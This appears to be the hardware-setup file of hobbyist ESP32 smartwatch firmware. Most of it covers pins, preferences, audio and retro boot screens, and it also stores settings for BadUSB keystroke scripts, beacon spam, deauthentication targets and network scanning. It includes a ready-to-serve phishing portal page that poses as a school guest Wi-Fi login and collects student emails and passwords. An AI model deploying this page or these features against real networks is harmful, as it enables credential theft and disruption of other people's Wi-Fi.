// --- HardwareConfig.cpp ---
#include "HardwareConfig.h"
#include "Globals.h"
#include "Display.h"
#include <Wire.h>
#include <WiFi.h>
#include <driver/i2s.h>
#include <time.h>

#define IIC_SDA_PMU 10
#define IIC_SCL_PMU 11
#define IIC_SDA_TOUCH 39
#define IIC_SCL_TOUCH 40
#define TOUCH_INT 16
#define TFT_BL 45

#define I2S_BCK_SPK 48   
#define I2S_WS_SPK 15    
#define I2S_DOUT_SPK 46  
#define I2S_WS_MIC 44    
#define I2S_DIN_MIC 47   

uint16_t bBG = TFT_BLACK, bFG = TFT_WHITE;
int bootY = 0, bootTftX = 0, bootTftY = 0, bootW = 240, bootH = 240;

bool enP0 = true, enP1 = true, enP2 = true, enP3 = true;
int timerAlarmMode = 0; 

// FIX: Hier werden die Farben & Sprache für den ganzen Code angemeldet
String hexHeadBG = "#111111", hexHeadFG = "#FFFFFF", hexAppBG = "#222222", hexWarn = "#FF0000";
uint16_t cHeadBG, cHeadFG, cAppBG, cWarn;
int sysLang = 0;

USBHIDKeyboard Keyboard;

String badUsbNames[3] = {"Rickroll", "Notepad Hello", "IPConfig CMD"};
String badUsbScripts[3] = {
    "GUI r\nDELAY 500\nSTRING https://www.youtube.com/watch?v=dQw4w9WgXcQ\nENTER",
    "GUI r\nDELAY 500\nSTRING notepad\nENTER\nDELAY 500\nSTRING Hallo aus der WatchOS Uhr!\nENTER",
    "GUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 500\nSTRING ipconfig\nENTER"
};
int currentBadUsbScript = 0;
String spamSSIDs = "Never,gonna,give,you,up";
int badUsbLayout = 1; 

String targetSSIDs[3] = {"", "", ""};
String targetPWDs[3] = {"", "", ""};
int currentTargetNmap = 0;
bool nmapActive = false;
int nmapState = 0;
int nmapIP = 1;
String nmapLog = "";
String nmapBaseIP = "192.168.1.";

bool deauthActive = false;
int deauthState = 0;
int currentDeauthTarget = 0;
uint8_t deauthMac[6];
bool isScanningAir = false;
int numScannedNetworks = 0;
String scannedSSIDs[15];
String scannedMACs[15];

const char* defaultEvilHTML = R"rawliteral(<!DOCTYPE html>
<html lang="de">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Netzwerk Login</title>
<style>body{font-family:sans-serif;background:#eee;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;} .box{background:#fff;padding:30px;border-radius:8px;box-shadow:0 4px 15px rgba(0,0,0,0.1);text-align:center;width:90%;max-width:350px;} input{width:100%;padding:10px;margin:10px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;} .btn{background:#0056b3;color:#fff;border:none;padding:12px;width:100%;border-radius:4px;cursor:pointer;}</style></head>
<body><div class="box"><h2>WLAN Registrierung</h2><form action="/submit" method="POST"><input type="text" name="schueler_id" placeholder="E-Mail" required><input type="password" name="passwort" placeholder="Passwort" required><input type="submit" class="btn" value="Verbinden"></form></div></body></html>)rawliteral";

String evilSSID = "Schul-WLAN_Gast";
String evilHTML = defaultEvilHTML;

int getBattery() {
    int p = pmu.getBatteryPercent();
    if (p <= 0) return (pmu.getBattVoltage() > 4100) ? 100 : 0;
    if (p > 100) return 100;
    return p;
}

void updateZielZeit() { memset(&zielZeit, 0, sizeof(struct tm)); zielZeit.tm_mday = gTag; zielZeit.tm_mon = gMonat - 1; zielZeit.tm_year = (gJahr + zielAlter) - 1900; }

void loadPreferences() {
    prefs.begin("clock", false);
    userSSID = prefs.getString("ssid", userSSID); userPWD = prefs.getString("pwd", userPWD); ntpZone = prefs.getString("ntpZ", ntpZone);
    apSSID = prefs.getString("apS", apSSID); apPWD = prefs.getString("apP", apPWD);
    gTag = prefs.getInt("tag", gTag); gMonat = prefs.getInt("monat", gMonat); gJahr = prefs.getInt("jahr", gJahr); gStunde = prefs.getInt("std", gStunde); gMinute = prefs.getInt("min", gMinute); zielAlter = prefs.getInt("alter", zielAlter);
    
    bootMode = prefs.getInt("bootM", bootMode); aodMode = prefs.getInt("aodM", aodMode);
    time_dim_start = prefs.getULong("tDim", time_dim_start); time_aod_start = prefs.getULong("tAod", time_aod_start); time_sleep_start = prefs.getULong("tSlp", time_sleep_start);
    aodActive = prefs.getBool("aod", aodActive); vibActive = prefs.getBool("vib", vibActive);
    maxBright = prefs.getInt("maxB", maxBright); minBright = prefs.getInt("minB", minBright);
    
    hexBG = prefs.getString("cBG", hexBG); hexFG = prefs.getString("cFG", hexFG); hexAcc1 = prefs.getString("cAcc1", hexAcc1); hexAcc2 = prefs.getString("cAcc2", hexAcc2); hexBat = prefs.getString("cBat", hexBat);
    // FIX: Neue Farben & Sprache aus Speicher laden
    hexHeadBG = prefs.getString("cHBG", hexHeadBG); hexHeadFG = prefs.getString("cHFG", hexHeadFG); hexAppBG = prefs.getString("cABG", hexAppBG); hexWarn = prefs.getString("cWrn", hexWarn);
    sysLang = prefs.getInt("lang", sysLang);
    
    enP0 = prefs.getBool("enP0", true); enP1 = prefs.getBool("enP1", true); enP2 = prefs.getBool("enP2", true); enP3 = prefs.getBool("enP3", true);
    timerAlarmMode = prefs.getInt("tAlarm", 0);
    t1 = prefs.getInt("t1", t1); t2 = prefs.getInt("t2", t2); t3 = prefs.getInt("t3", t3);
    historyCount = prefs.getInt("hCount", 0); if (historyCount > 0 && historyCount <= MAX_HISTORY) prefs.getBytes("hData", batHistoryPct, MAX_HISTORY); else historyCount = 0;
    
    evilSSID = prefs.getString("evSsid", evilSSID); evilHTML = prefs.getString("evHtml", evilHTML); if(evilHTML.length() < 100) evilHTML = defaultEvilHTML; 
    
    badUsbNames[0] = prefs.getString("buN0", badUsbNames[0]); badUsbScripts[0] = prefs.getString("buS0", badUsbScripts[0]);
    badUsbNames[1] = prefs.getString("buN1", badUsbNames[1]); badUsbScripts[1] = prefs.getString("buS1", badUsbScripts[1]);
    badUsbNames[2] = prefs.getString("buN2", badUsbNames[2]); badUsbScripts[2] = prefs.getString("buS2", badUsbScripts[2]);
    
    targetSSIDs[0] = prefs.getString("tgS0", targetSSIDs[0]); targetPWDs[0] = prefs.getString("tgP0", targetPWDs[0]);
    targetSSIDs[1] = prefs.getString("tgS1", targetSSIDs[1]); targetPWDs[1] = prefs.getString("tgP1", targetPWDs[1]);
    targetSSIDs[2] = prefs.getString("tgS2", targetSSIDs[2]); targetPWDs[2] = prefs.getString("tgP2", targetPWDs[2]);

    spamSSIDs = prefs.getString("spamSsid", spamSSIDs);
    badUsbLayout = prefs.getInt("buLay", badUsbLayout);
    nmapBaseIP = prefs.getString("nmapIP", nmapBaseIP);
    
    netSalary = prefs.getFloat("netS", netSalary); partTimePct = prefs.getInt("pt", partTimePct); vacationDays = prefs.getInt("vac", vacationDays); sickDays = prefs.getInt("sick", sickDays); workHoursPerDay = prefs.getFloat("wh", workHoursPerDay); workDaysYear = prefs.getInt("wd", workDaysYear);
    child1Name = prefs.getString("c1n", child1Name); child1Date = prefs.getString("c1d", child1Date); child1Time = prefs.getString("c1t", child1Time); child2Name = prefs.getString("c2n", child2Name); child2Date = prefs.getString("c2d", child2Date); child2Time = prefs.getString("c2t", child2Time); child3Name = prefs.getString("c3n", child3Name); child3Date = prefs.getString("c3d", child3Date); child3Time = prefs.getString("c3t", child3Time);
    parentName = prefs.getString("pN", parentName); parentDate = prefs.getString("pD", parentDate); parentTime = prefs.getString("pT", parentTime);
    prefs.end();
    
    if(currentPage == 0 && !enP0) currentPage = 1; if(currentPage == 1 && !enP1) currentPage = 2; if(currentPage == 2 && !enP2) currentPage = 3; if(currentPage == 3 && !enP3) currentPage = 0; mainPage = currentPage;
}

void initHardware() {
    tft.init(); tft.setRotation(2); tft.fillScreen(TFT_BLACK); ledcAttach(TFT_BL, 5000, 8); setBrightness(255);
    Wire.begin(IIC_SDA_PMU, IIC_SCL_PMU);
    if (pmu.init(Wire, IIC_SDA_PMU, IIC_SCL_PMU, AXP2101_SLAVE_ADDRESS)) { pmu.clearIrqStatus(); pmu.enableBattVoltageMeasure(); pmu.enableVbusVoltageMeasure(); pmu.setALDO1Voltage(3300); pmu.enableALDO1(); pmu.setALDO2Voltage(3300); pmu.enableALDO2(); pmu.setALDO3Voltage(3300); pmu.enableALDO3(); pmu.setALDO4Voltage(3300); pmu.enableALDO4(); pmu.setBLDO1Voltage(3300); pmu.enableBLDO1(); pmu.setBLDO2Voltage(3300); pmu.enableBLDO2(); pmu.disableIRQ(XPOWERS_AXP2101_ALL_IRQ); pmu.enableIRQ(XPOWERS_AXP2101_BAT_INSERT_IRQ | XPOWERS_AXP2101_BAT_REMOVE_IRQ | XPOWERS_AXP2101_VBUS_INSERT_IRQ | XPOWERS_AXP2101_VBUS_REMOVE_IRQ | XPOWERS_AXP2101_PKEY_SHORT_IRQ); pmu.clearIrqStatus(); } 
    delay(100); if (drv.begin(Wire, IIC_SDA_PMU, IIC_SCL_PMU)) { drv.selectLibrary(1); drv.setMode(0); }
    Wire1.begin(IIC_SDA_TOUCH, IIC_SCL_TOUCH); touch.setPins(-1, TOUCH_INT); touch.begin(Wire1, 0x38, IIC_SDA_TOUCH, IIC_SCL_TOUCH);
    Mouse.begin(); Keyboard.begin(); USB.begin();       
}

void playSynthSound(int type, int duration) {
    if (!vibActive) { delay(duration); return; }
    int sampleRate = 16000; size_t bytesWritten; int16_t sample[256]; int frames = (sampleRate / 256) * (duration / 1000.0);
    for(int f = 0; f < frames; f++) { for(int i = 0; i < 256; i++) {
            if (type == 1) { sample[i] = (f < 1 && i < 40) ? ((rand() % 32000) - 16000) : 0; } 
            else if (type == 2) { sample[i] = (rand() % 10 > 6) ? ((rand() % 16000) - 8000) : 0; } 
            else if (type == 3) { int freq = 300 + (f % 5) * 20; sample[i] = (((f * 256 + i) * freq / sampleRate) % 2 == 0) ? 6000 : -6000; } 
            else if (type == 4) { sample[i] = (((f * 256 + i) * 1000 / sampleRate) % 2 == 0) ? 12000 : -12000; } 
            else if (type == 5) { sample[i] = (((f * 256 + i) * 300 / sampleRate) % 2 == 0) ? 15000 : -15000; } 
            else if (type == 6) { sample[i] = (f % 4 < 2) ? ((((f * 256 + i) * 1500 / sampleRate) % 2 == 0) ? 12000 : -12000) : 0; }
        } i2s_write(I2S_NUM_0, sample, sizeof(sample), &bytesWritten, portMAX_DELAY);
    }
}

void playBootSound(int type) { if (!vibActive) return; drv.selectLibrary(1); drv.setMode(0); if (type == 1) { playSynthSound(1, 15); } else if (type == 2) { drv.setWaveform(0, 58); drv.setWaveform(1, 0); drv.run(); playSynthSound(2, 60); } else if (type == 3) { drv.setWaveform(0, 64); drv.setWaveform(1, 0); drv.run(); playSynthSound(3, 200); } }

void bootLog(String left, String right = "", uint16_t rightCol = TFT_WHITE) { if (bootY >= bootH - 16) { cdSprite.scroll(0, -16); bootY -= 16; cdSprite.fillRect(0, bootY, bootW, 16, bBG); } cdSprite.setTextDatum(TL_DATUM); cdSprite.setTextColor(bFG, bBG); cdSprite.drawString(left, 0, bootY, 2); if (right != "") { cdSprite.setTextDatum(TR_DATUM); cdSprite.setTextColor(rightCol, bBG); cdSprite.drawString(right, bootW - 4, bootY, 2); } cdSprite.pushSprite(bootTftX, bootTftY); bootY += 16; delay(80); }

void bootUpdateRight(String right, uint16_t rightCol = TFT_WHITE) { if(bootY >= 16) { cdSprite.fillRect(bootW - 80, bootY - 16, 80, 16, bBG); cdSprite.setTextDatum(TR_DATUM); cdSprite.setTextColor(rightCol, bBG); cdSprite.drawString(right, bootW - 4, bootY - 16, 2); cdSprite.pushSprite(bootTftX, bootTftY); } }

void showBootSequence() {
    i2s_config_t i2s_tx_config; memset(&i2s_tx_config, 0, sizeof(i2s_tx_config)); i2s_tx_config.mode = (i2s_mode_t)(I2S_MODE_MASTER | I2S_MODE_TX); i2s_tx_config.sample_rate = 16000; i2s_tx_config.bits_per_sample = I2S_BITS_PER_SAMPLE_16BIT; i2s_tx_config.channel_format = I2S_CHANNEL_FMT_ONLY_LEFT; i2s_tx_config.communication_format = I2S_COMM_FORMAT_STAND_I2S; i2s_tx_config.intr_alloc_flags = ESP_INTR_FLAG_LEVEL1; i2s_tx_config.dma_desc_num = 4; i2s_tx_config.dma_frame_num = 256; i2s_tx_config.use_apll = false;
    i2s_pin_config_t tx_pin_config; memset(&tx_pin_config, 0, sizeof(tx_pin_config)); tx_pin_config.bck_io_num = I2S_BCK_SPK; tx_pin_config.ws_io_num = I2S_WS_SPK; tx_pin_config.data_out_num = I2S_DOUT_SPK; tx_pin_config.data_in_num = -1; tx_pin_config.mck_io_num = -1;
    i2s_driver_install(I2S_NUM_0, &i2s_tx_config, 0, NULL); i2s_set_pin(I2S_NUM_0, &tx_pin_config); i2s_zero_dma_buffer(I2S_NUM_0);

    if (bootMode == 4) {
        WiFi.mode(WIFI_STA); WiFi.begin(userSSID.c_str(), userPWD.c_str()); int wifiRetry = 0; while (WiFi.status() != WL_CONNECTED && wifiRetry < 10) { delay(200); wifiRetry++; }
        if (WiFi.status() == WL_CONNECTED) { configTzTime(ntpZone.c_str(), ntpServer.c_str()); struct tm timeinfo; getLocalTime(&timeinfo, 2000); } WiFi.disconnect(true); WiFi.mode(WIFI_OFF);
        i2s_driver_uninstall(I2S_NUM_0); i2s_config_t i2s_rx_config; memset(&i2s_rx_config, 0, sizeof(i2s_rx_config)); i2s_rx_config.mode = (i2s_mode_t)(I2S_MODE_MASTER | I2S_MODE_RX | I2S_MODE_PDM); i2s_rx_config.sample_rate = 16000; i2s_rx_config.bits_per_sample = I2S_BITS_PER_SAMPLE_16BIT; i2s_rx_config.channel_format = I2S_CHANNEL_FMT_RIGHT_LEFT; i2s_rx_config.communication_format = I2S_COMM_FORMAT_STAND_I2S; i2s_rx_config.intr_alloc_flags = ESP_INTR_FLAG_LEVEL1; i2s_rx_config.dma_desc_num = 2; i2s_rx_config.dma_frame_num = 128; i2s_rx_config.use_apll = false; i2s_pin_config_t rx_pin_config; memset(&rx_pin_config, 0, sizeof(rx_pin_config)); rx_pin_config.bck_io_num = -1; rx_pin_config.ws_io_num = I2S_WS_MIC; rx_pin_config.data_out_num = -1; rx_pin_config.data_in_num = I2S_DIN_MIC; rx_pin_config.mck_io_num = -1;
        if(i2s_driver_install(I2S_NUM_0, &i2s_rx_config, 0, NULL) == ESP_OK) { i2s_set_pin(I2S_NUM_0, &rx_pin_config); i2s_stop(I2S_NUM_0); }
        cdSprite.deleteSprite(); cdSprite.createSprite(240, 240 - 34); return; 
    }

    bootTftX = 0; bootTftY = 0; bootW = 240; bootH = 240; cdSprite.createSprite(bootW, bootH);
    if (bootMode == 0) { bBG = TFT_BLACK; bFG = TFT_WHITE; cdSprite.fillSprite(bBG); bootY = 0; uint16_t epaCol = tft.color565(180, 255, 100); int ex = 115, ey = 5; cdSprite.drawCircle(ex+50, ey+35, 40, epaCol); cdSprite.drawCircle(ex+50, ey+35, 39, epaCol); cdSprite.fillRect(ex, ey+35, 120, 50, bBG); cdSprite.setTextFont(4); cdSprite.setTextColor(epaCol); cdSprite.drawString("energy", ex+5, ey+10); cdSprite.setTextFont(2); cdSprite.drawString("*", ex+85, ey+5); cdSprite.drawLine(ex, ey+35, ex+105, ey+35, epaCol); cdSprite.setTextFont(1); cdSprite.drawString("EPA POLLUTION PREVENTER", ex-10, ey+40); cdSprite.setTextFont(2); playBootSound(4); delay(500); bootLog("ROM PCI/ISA BIOS"); bootLog("(2A59I000)"); bootLog("AWARD SOFTWARE"); delay(600); bootLog(""); bootLog("PENTIUM-S CPU at 66MHz"); delay(300); bootLog("Memory Test :"); playBootSound(2); delay(500); bootLog("8192K OK"); delay(800); bootLog("Starting MS-DOS 6.22..."); playBootSound(2); delay(800); bootLog(""); cdSprite.setTextDatum(TL_DATUM); cdSprite.setTextColor(bFG, bBG); String cmd = "smartwatch.exe"; cdSprite.drawString("C:\\> ", 0, bootY, 2); int curX = cdSprite.textWidth("C:\\> ", 2); for(int i=0; i<cmd.length(); i++) { cdSprite.drawChar(cmd[i], curX, bootY, 2); curX += cdSprite.textWidth(String(cmd[i]), 2); cdSprite.pushSprite(0, 0); playBootSound(1); delay(random(60, 200)); } bootY += 16; delay(500); playBootSound(2); bootLog("Executing WatchOS..."); delay(1000); 
    } else if (bootMode == 1) { bootTftX = 20; bootTftY = 20; bootW = 200; bootH = 200; uint16_t c64_border = tft.color565(136, 126, 203); bBG = tft.color565(64, 49, 141); bFG = c64_border; tft.fillScreen(c64_border); cdSprite.deleteSprite(); cdSprite.createSprite(bootW, bootH); cdSprite.fillSprite(bBG); bootY = 0; playBootSound(4); bootLog("    *** COMMODORE 64 ***"); bootLog(" 64K RAM SYSTEM  38911 FREE"); bootLog(""); bootLog("READY."); delay(1000); cdSprite.setTextDatum(TL_DATUM); cdSprite.setTextColor(bFG, bBG); String cmd1 = "LOAD\"WATCHOS\",8,1"; int curX = 0; for(int i=0; i<cmd1.length(); i++) { cdSprite.drawChar(cmd1[i], curX, bootY, 2); curX += cdSprite.textWidth(String(cmd1[i]), 2); cdSprite.pushSprite(bootTftX, bootTftY); playBootSound(1); delay(random(60, 200)); } bootY += 16; delay(500); playBootSound(3); bootLog("SEARCHING FOR WATCHOS"); delay(1000); bootLog("LOADING"); playBootSound(3); delay(1000); bootLog("READY."); delay(500); String cmd2 = "RUN"; curX = 0; for(int i=0; i<cmd2.length(); i++) { cdSprite.drawChar(cmd2[i], curX, bootY, 2); curX += cdSprite.textWidth(String(cmd2[i]), 2); cdSprite.pushSprite(bootTftX, bootTftY); playBootSound(1); delay(random(60, 200)); } bootY += 16; delay(800); tft.fillScreen(c64_border); cdSprite.fillSprite(bBG); bootY = 0; 
    } else if (bootMode == 3) { bBG = TFT_BLUE; bFG = TFT_WHITE; cdSprite.fillSprite(bBG); bootY = 0; playBootSound(5); bootLog(" Windows"); bootLog(""); bootLog(" A fatal exception 0E has occurred"); bootLog(" at 0028:C0011E36 in VXD VMM(01)"); bootLog(" + 00010E36."); bootLog(""); bootLog(" The current application will be"); bootLog(" terminated."); bootLog(""); bootLog(" * Press any key to terminate."); bootLog(" * Press CTRL+ALT+DEL to restart."); delay(2500); cdSprite.fillSprite(bBG); bootY = 0; playBootSound(2); bootLog(" Safe Mode Boot Recovery..."); bootLog(""); }

    uint16_t okCol = (bootMode == 0) ? TFT_WHITE : bFG; uint16_t errCol = (bootMode == 0) ? TFT_WHITE : bFG; uint16_t infCol = (bootMode == 0) ? TFT_WHITE : bFG; uint16_t waitCol = (bootMode == 0) ? TFT_WHITE : bFG;
    bootLog("LilyGo BIOS v2.0", "OK", okCol); bootLog("Copyright (C) 2026", "", okCol); bootLog("Michael Strassburger", "", okCol); bootLog("======================="); bootLog("CPU: ESP32-S3", String(ESP.getCpuFreqMHz()) + " MHz", infCol); bootLog("SRAM Base", String(ESP.getHeapSize() / 1024) + " KB", infCol); bootLog("OPI PSRAM", String(ESP.getPsramSize() / 1024) + " KB", infCol); bootLog("Flash ROM", String(ESP.getFlashChipSize() / 1024 / 1024) + " MB", infCol); WiFi.mode(WIFI_STA); bootLog("MAC", WiFi.macAddress(), infCol); bootLog("", ""); bootLog("--- System Init ---"); bootLog("I2C Bus", "OK", okCol); bootLog("PMU AXP2101", "OK", okCol); bootLog(" BATT Volt", String(pmu.getBattVoltage() / 1000.0) + "V", infCol); bootLog("Haptic DRV", "OK", okCol); bootLog("Touch FT6X36", "OK", okCol);
    i2s_driver_uninstall(I2S_NUM_0); i2s_config_t i2s_rx_config; memset(&i2s_rx_config, 0, sizeof(i2s_rx_config)); i2s_rx_config.mode = (i2s_mode_t)(I2S_MODE_MASTER | I2S_MODE_RX | I2S_MODE_PDM); i2s_rx_config.sample_rate = 16000; i2s_rx_config.bits_per_sample = I2S_BITS_PER_SAMPLE_16BIT; i2s_rx_config.channel_format = I2S_CHANNEL_FMT_RIGHT_LEFT; i2s_rx_config.communication_format = I2S_COMM_FORMAT_STAND_I2S; i2s_rx_config.intr_alloc_flags = ESP_INTR_FLAG_LEVEL1; i2s_rx_config.dma_desc_num = 2; i2s_rx_config.dma_frame_num = 128; i2s_rx_config.use_apll = false; i2s_pin_config_t rx_pin_config; memset(&rx_pin_config, 0, sizeof(rx_pin_config)); rx_pin_config.bck_io_num = -1; rx_pin_config.ws_io_num = I2S_WS_MIC; rx_pin_config.data_out_num = -1; rx_pin_config.data_in_num = I2S_DIN_MIC; rx_pin_config.mck_io_num = -1;
    if(i2s_driver_install(I2S_NUM_0, &i2s_rx_config, 0, NULL) == ESP_OK) { i2s_set_pin(I2S_NUM_0, &rx_pin_config); i2s_stop(I2S_NUM_0); bootLog("Audio Mic", "OK", okCol); } else { bootLog("Audio Mic", "FAIL", errCol); }
    bootLog("EEPROM NVRAM", "OK", okCol); WiFi.begin(userSSID.c_str(), userPWD.c_str()); int wifiRetry = 0; bootLog("WLAN", "Wait", waitCol); while (WiFi.status() != WL_CONNECTED && wifiRetry < 8) { bootUpdateRight(String(wifiRetry+1), waitCol); delay(400); wifiRetry++; }
    if (WiFi.status() == WL_CONNECTED) { bootUpdateRight("OK", okCol); configTzTime(ntpZone.c_str(), ntpServer.c_str()); struct tm timeinfo; int ntpWait = 0; bootLog("NTP Sync", "Wait", waitCol); while (!getLocalTime(&timeinfo, 1000) && ntpWait < 2) { bootUpdateRight(String(ntpWait+1), waitCol); ntpWait++; } bootUpdateRight("OK", okCol); } else { bootUpdateRight("SKIP", errCol); } WiFi.disconnect(true); WiFi.mode(WIFI_OFF);
    bootLog("", ""); bootLog("Boot Complete."); delay(800); cdSprite.deleteSprite(); cdSprite.createSprite(240, 240 - 34); 
}